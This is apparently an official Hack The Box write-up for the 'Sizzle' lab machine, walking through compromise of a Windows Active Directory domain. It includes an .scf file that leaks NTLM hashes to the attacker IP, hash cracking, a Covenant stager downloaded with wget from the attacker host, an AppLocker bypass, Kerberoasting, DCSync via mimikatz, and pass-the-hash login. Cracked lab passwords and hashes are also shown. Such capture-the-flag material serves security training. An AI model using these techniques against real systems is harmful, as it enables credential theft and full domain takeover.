@@ -1,0 +1,457 @@
+Sizzle
+
+08t h May 2019 / Document No D19.100.21
+
+Prepared By: MinatoTW
+Machine Author: mrb3n and lkys37en
+Difficulty: Insane
+Classification: Official
+
+                                                                       Page 1 / 20
+SYNOPSIS
+
+Sizzle is an "Insane" difficulty WIndows box with an Active Directory environment. A writable
+directory in an SMB share allows to steal NTLM hashes which can be cracked to access the
+Certificate Services Portal. A self signed certificate can be created using the CA and used for
+PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is
+found to have Replication rights which can be abused to get Administrator hashes via DCSync.
+
+Skills Required      Skills Learned
+
+     AD Enumeration       Stealing hashes
+     Mimikatz usage       Passwordless login
+                          Kerberoasting
+                          DCSync
+
+                                              Page 2 / 20
+ENUMERATION
+
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.103 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ' ,' | sed s/,$//)
+ nmap -p$ports -sC -sV 10.10.10.103
+
+A lot of open ports common to Windows AD.
+
+Nmap scan report f or 10.10.10.103
+
+Host is up (0.37s latency).
+
+Not shown: 65506 filtered ports
+
+PORT  STATE SERVICE
+
+21/tcp open ftp
+
+53/tcp open domain
+
+80/tcp open http
+
+135/tcp open msrpc
+
+139/tcp open netbios-ssn
+
+389/tcp open ldap
+
+443/tcp open https
+
+445/tcp open microsoft-ds
+
+464/tcp open kpasswd5
+
+593/tcp open http-rpc-epmap
+
+636/tcp open ldapssl
+
+3268/tcp open globalcatLDAP
+
+3269/tcp open globalcatLDAPssl
+
+5985/tcp open wsman
+
+5986/tcp open wsmans
+
+9389/tcp open adws
+
+47001/tcp open winrm
+
+---------------- SNIP ---------------
+
+49995/tcp open unknown
+
+50008/tcp open unknown
+
+Nmap d one: 1 IP address (1 host up) scanned in 199.02 seconds
+
+                                                                Page 3 / 20
+Running service scan on the common ports,
+
+Nmap scan report f or 10.10.10.103
+Host is up (0.23s latency).
+
+PORT STATE SERVICE      VERSION
+
+21/tcp open ftp             Microsoft ftpd
+
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+| ftp-syst:
+
+|_ SYST: Windows_NT
+
+53/tcp open domain?
+
+| fingerprint-strings:
+
+| DNSVersionBindReqTCP:
+
+|  version
+
+|_ bind
+
+80/tcp open http            Microsoft IIS httpd 10.0
+
+| http-methods:
+
+|_ Potentially risky methods: TRACE
+
+|_http-server-header: Microsoft-IIS/10.0
+
+|_http-title: Site doesn' t have a title (text/html).
+
+389/tcp open ldap           Microsoft Windows Active Directory LDAP
+
+(Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+
+| ssl-cert: Subject: commonName=sizzle.htb.local
+
+| Not valid before: 2018-07-03T17:58:55
+
+|_Not valid after: 2020-07-02T17:58:55
+
+|_ssl-date: 2019-05-09T11:36:59+00:00; -5m02s from scanner time.
+
+443/tcp open ssl/http       Microsoft IIS httpd 10.0
+
+|_http-title: Site doesn't have a title (text/html).
+
+| ssl-cert: Subject: commonName=sizzle.htb.local
+
+| Not valid before: 2018-07-03T17:58:55
+
+|_Not valid after: 2020-07-02T17:58:55
+
+|_ssl-date: 2019-05-09T11:36:46+00:00; -5m03s from scanner time.
+
+| tls-alpn:
+
+| h2
+
+|_ http/1.1
+
+445/tcp open microsoft-ds?
+
+5985/tcp open http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+                                                                  Page 4 / 20
+ |_http-title: Not Found
+ Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Nmap finds the Domain to be HTB.LOCAL and the FQDN is sizzle.htb.local. Anonymous ftp login
+is allowed. Both http and https are running IIS and WinRM could be used later to login.
+
+IIS SERVER
+
+Both http and https servers have the same image on them.
+
+GOBUSTER
+
+Running gobuster on both ports.
+ gobuster -w /path/to/directory-list-2.3-medium.txt -t 100 -k -u
+ https://10.10.10.103/
+ gobuster -w /path/to/directory-list-2.3-medium.txt -t 100 -u
+ http://10.10.10.103/
+
+                                                                                                                 Page 5 / 20
+FTP ENUMERATION
+
+Anonymous login was allowed on FTP but it had no contents.
+
+SMB ENUMERATION
+
+Connecting to SMB via a NULL session and listing the shares finds two uncommon shares,
+Department Shares and Operations share. CertEnroll is a default AD CS share but the other two
+are local.
+ smbclient -N -L \\\\10.10.10.103
+
+Connect to the share to examine its contents. The share can be mounted locally.
+                                                                                                                 Page 6 / 20
+ mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department
+ Shares' /mnt
+ cd /mnt
+
+We land in a share with a lot of folders, out of which some might be writable. A small bash script
+can determine this.
+
+ #!/bin/bash
+ list=$(find /mnt -type d)
+ for d i n $list
+ do
+
+           touch $d/x 2>/dev/null
+           if [ $? -eq 0 ]
+           then
+
+                               echo $ d " is writable"
+           fi
+ done
+
+The script returns in a while and finds two folders to be writable.
+
+CERTSRV
+
+Searching about AD CertEnroll takes us to this p age. According to it, the web service is
+accessible at /certsrv. Checking this on Sizzle we find that the service is running. But it's
+password protected.
+
+                                                                                                                 Page 7 / 20
+STEALING HASHES
+
+As we found a few writable folders earlier we could implant an .scf file so that it sends us the
+user's hashes when he opens the share.
+
+Create an scf file with contents,
+ [Shell]
+ Command=2
+ IconFile=\\10.10.14.3\share\pwn.ico
+ [Taskbar]
+ Command=ToggleDesktop
+
+Copy it to the writable folders and fire up Responder.
+ cp pwn.scf /mnt/Users/Public
+ cp pwn.scf /mnt/ZZ_ARCHIVE
+ Responder -I tun0
+
+After a while we should receive hashes on Responder for amanda.
+
+Copy the hash into a file and crack it with john and rockyou.
+ john h ash -w=/path/to/rockyou.txt
+
+The password is cracked as Ashare1972.
+
+                                                               Page 8 / 20
+FOOTHOLD
+
+Now that we have a password lets try to login through WinRM. I'll be using this ruby s cript.
+Change the configuration to suit our requirement. Trying to login fails because the server expects
+certificate based authentication. For that we need to create certificates signed by the AD CS.
+More on passwordless WinRM h ere.
+
+CREATING CERTIFICATES
+
+We can login to the AD CS web page using the obtained credentials. To create a certificate first
+we'll need to create a CSR (Certificate Signing Request). We can use openssl to do the job.
+ openssl genrsa -des3 -out amanda.key 2048 # create private key
+ openssl req -new -key amanda.key -out amanda.csr # create csr
+ ls -la amanda.*
+Enter a passphrase when prompted and the same while creating the CSR. Press enter through all
+the prompts.
+
+We should be left with a private key and a csr. Now to request a certificate sign-in to /certsrv.
+
+                                                                                                                 Page 9 / 20
+Click on Request a certificate and then advanced certificate request.
+Now copy the csr contents and paste it into the box. Leave the rest as it is.
+
+Click on submit and download the certificate as base64 encoded.
+
+Ruby WinRM supports certificate based authentication.
+
+                                                                               Page 10 / 20
+LOGGING IN TO WINRM
+
+Make the following changes to the script.
+ conn = WinRM::Connection.new(
+
+    endpoint: 'https://10.10.10.103:5986/wsman',
+    transport: :ssl,
+    :client_cert => 'certnew.cer', # from the server
+    :client_key => ' amanda.key', # private key
+    :no_ssl_peer_verification => t rue
+ )
+Now execute the script and enter the password you used while creating the certificate.
+ rlwrap ruby winrm_shell.rb
+
+And we have a shell.
+
+                                                                                                                 Page 11 / 20
+LATERAL MOVEMENT
+COVENANT
+
+Now that we have a shell, lets use Covenant to have a better grip and enumerate the AD.
+Covenant is a versatile framework written in dotnet core. More on it h ere.
+Start Covenant and then Elite.
+ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v
+ `p wd` /Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
+ docker run -it --rm --name elite -v `p wd`/Data:/app/Data elite --username
+ AdminUser --computername 10.10.16.3
+
+Once both are up and running start a Listener on elite.
+
+ Listeners
+ HTTP
+ Set ConnectAddress 10.10.16.3
+
+Now we create a Launcher which is a stager for Covenant. Lets create a binary launcher.
+
+ back
+ Launchers
+ binary
+ set listenername sizzle
+ generate
+ host /pwn.exe
+
+The file pwn.exe is created and hosted on the server.
+
+                                                                                                                Page 12 / 20
+Download the file on the box directly using wget. Before executing it we need to bypass
+applocker. This can be simply done by copying the binary to
+C:\Windows\System32\spool\drivers\color.
+ wget http://10.10.16.3/pwn.exe -O pwn.exe
+ cp pwn.exe C:\Windows\System32\spool\drivers\color
+ C:\Windows\System32\spool\drivers\color\pwn.exe
+
+We get a hit on our listener and the Grunt is active. Let's interact with it.
+ back
+ back
+ Grunts
+ Interact <id>
+
+                                                                                                                Page 13 / 20
+ENUMERATION
+
+Now lets enumerate the domain. Use the command GetDomainUser to get a list of users in the
+domain.
+
+Apart from the common accounts and amanda, we find three other accounts.
+ samaccountname: mrlky
+ samaccounttype: USER_OBJECT
+ distinguishedname: CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+ cn: mrlky
+ objectsid: S-1-5-21-2379389067-1826974543-3574127760-1603
+ grouptype: 0
+ ---------------- SNIP ----------------
+
+ samaccountname: sizzler
+ samaccounttype: USER_OBJECT
+ distinguishedname: CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
+ cn: sizzler
+ objectsid: S-1-5-21-2379389067-1826974543-3574127760-1604
+ grouptype: 0
+ ---------------- SNIP ----------------
+
+ samaccountname: Administrator
+ samaccounttype: USER_OBJECT
+ distinguishedname: CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
+ objectsid: S-1-5-21-2379389067-1826974543-3574127760-500
+ grouptype: 0
+ admincount: 1
+ name: Administrator
+ memberof: CN=Group Policy Creator Owners,CN=Users,DC=HTB,DC=LOCAL,
+ CN=Domain Admins,CN=Users,DC=HTB,DC=LOCAL, CN=Enterprise
+ Admins,CN=Users,DC=HTB,DC=
+ LOCAL, CN=Schema Admins,CN=Users,DC=HTB,DC=LOCAL,
+
+                                                                                                                Page 14 / 20
+ CN=Administrators,CN=Builtin,DC=HTB,DC=LOCAL
+Both sizzler and Administrator are Domain Admins. There appears to be an SPN associated with
+the user mrlky.
+
+This can be confirmed by using the built-in utility setspn.exe.
+ shell setspn.exe -t htb -q */*
+On running it we find the SPN entry for mrlky.
+
+This allows us to kerberoast and get his hash.
+
+KERBEROAST
+
+In order to kerberoast we need to make a token using our credentials as the WinRM used
+certificate based authentication and not credential based.
+This is what happens without a token. It errors out due to invalid credentials.
+
+                                                                                                                Page 15 / 20
+Use MakeToken to create a token of logontype 2 which is used for a normal login. And then use
+kerberoast.
+ MakeToken amanda htb Ashare1972
+ Kerberoast mrlky hashcat
+
+And we receive the hash. Copy it to a file and crack it using hashcat,
+ /opt/hashcat/hashcat-5.1.0/hashcat64.bin -m 13100 -a 0 mrlky rockyou.txt
+The password is cracked as Football#7 .
+Now we can use this to get a shell as mrlky. Repeat the same process as amanda to create a csr
+and generate a certificate to get a shell as mrlky. Execute the same binary to get a grunt as mrlky.
+
+                                                                                                                Page 16 / 20
+PRIVILEGE ESCALATION
+
+Lets import PowerView and enumerate the domain. Download P owerView.ps1 into the data
+folder.
+ wget
+ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/Pow
+ erView.ps1
+ PowerShellImport PowerView.ps1
+Now lets see which users have Replication Rights in the DC.
+ powershell Get-ObjectACL " DC=htb,DC=local" -ResolveGUIDs | ? {
+ ($ _.ActiveDirectoryRights -match 'GenericAll') -or ($ _.ObjectAceType -match
+ 'Replication-Get') }
+Running this we find an object with SID S-1-5-21-2379389067-1826974543-3574127760-1603
+which possesses Replication Rights.
+
+                                                                                                                Page 17 / 20
+And the SID belongs to mrlky.
+
+DCSYNC
+
+Having the DS-Replication-Get-Changes-All privilege allows us to perform DCSync. Lets use
+DCSync to get the Administrator hash.
+ DCSync administrator htb.local sizzle
+Or using mimikatz,
+ mimikatz lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle
+
+                                                                                                                Page 18 / 20
+We obtain the NTLM hash as f6b7160bfc91823792e0ac3a162c9267 and the LM hash as
+336d863559a3f7e69371a85ad959a675. Using this we can login via psexec or wmiexec with the
+hash in the form LM:NTLM.
+ wmiexec.py administrator@10.10.10.103 -hashes
+ 336d863559a3f7e69371a85ad959a675:f6b7160bfc91823792e0ac3a162c9267
+
+APPENDIX
+SETTING UP COVENANT
+
+ git clone --recurse-submodules https://github.com/cobbr/Covenant
+ cd Covenant/Covenant
+ docker build -t covenant .
+ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v
+ `pwd` /Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
+
+                                                                                                                Page 19 / 20
+SETTING UP ELITE
+
+ git clone --recurse-submodules https://github.com/cobbr/Elite
+ cd Elite/Elite
+ docker build -t elite .
+ docker run -it --rm --name elite -v `p wd`/Data:/app/Data elite --username
+ AdminUser --computername 10.10.16.2
+
+POWERVIEW COMMAND REFERENCE
+
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+MIMIKATZ COMMAND REFERENCE
+
+https://github.com/gentilkiwi/mimikatz/wiki
+
+                                                                                                               Page 20 / 20
+
